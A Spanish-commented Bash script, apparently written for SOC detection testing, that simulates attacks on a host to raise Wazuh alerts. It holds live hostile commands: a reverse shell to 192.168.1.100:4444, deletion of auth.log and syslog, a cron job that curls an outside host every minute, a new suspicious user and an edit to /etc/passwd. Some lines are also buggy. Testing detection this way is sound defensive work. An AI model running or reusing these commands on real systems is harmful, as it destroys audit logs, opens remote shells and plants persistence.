#!/bin/bash
# Simulador de ataques para web01 - Genera alertas en Wazuh SOC
# Asegúrate de tener privilegios de root para ejecutar

echo "🚨 Simulando ataques comunes para pruebas SOC en web01..."

# 1. Escaneo de puertos con nmap simulado
echo "🔍 Simulando escaneo de puertos..."
nmap -sS localhost -p 22,80,443 -T4 -Pn > /dev/null 2>&1

# 2. Intentos fallidos de login SSH
echo "🔑 Simulando intentos fallidos de SSH..."
for i in {1..5}; do
  ssh invaliduser@localhost -o PasswordAuthentication=no -o StrictHostKeyChecking=no -o ConnectTimeout=1
done

# 3. Creación de usuario sospechoso
echo "👤 Creando usuario atacante..."
sudo useradd atacante123

# 4. Modificación de archivo sensible
echo "📝 Modificando archivo crítico..."
sudo echo "# Simulación de modificación crítica" >> /etc/passwd

# 5. Acceso a binarios sospechosos
echo "💥 Accediendo a binarios potencialmente peligrosos..."
touch /tmp/rev_shell.sh
chmod +x /tmp/rev_shell.sh
echo -e "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/rev_shell.sh
./tmp/rev_shell.sh || true

# 6. Eliminación de logs (simulada)
echo "🧹 Simulando intento de eliminar logs..."
sudo rm -f /var/log/auth.log /var/log/syslog || true

# 7. Actividad en cron
echo "⏰ Agregando tarea sospechosa en cron..."
echo "* * * * * root curl http://malicioso.exploit" | sudo tee /etc/cron.d/cronbackdoor > /dev/null

echo "✅ Simulación finalizada. Espera unos segundos para que Wazuh procese los eventos."
